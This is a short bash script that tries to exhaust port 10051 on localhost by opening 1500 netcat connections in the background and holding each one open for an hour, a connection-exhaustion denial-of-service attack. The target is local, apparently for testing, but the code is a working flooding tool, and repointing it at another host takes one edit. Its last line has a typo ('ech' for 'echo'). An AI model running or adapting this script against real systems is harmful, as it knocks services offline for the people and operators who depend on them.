#!/bin/bash

# Target server (localhost in this case)
TARGET="127.0.0.1"
PORT=10051

# Number of connections to attempt (adjust based on your system's limits)
CONNECTIONS=1500

echo "Attempting to exhaust port $PORT on $TARGET by opening $CONNECTIONS connections..."

for ((i=1; i<=CONNECTIONS; i++)); do
    # Open a connection in the background and keep it alive
    nc -w 3600 "$TARGET" "$PORT" < /dev/null &
    if (( i % 1000 == 0 )); then
        echo "Opened $i connections..."
    fi
done

echo "Done. Check system state (e.g., 'ss -tunap | grep :10051' or 'netstat -tunap | grep :10051')."
ech "Run this ss -ltn"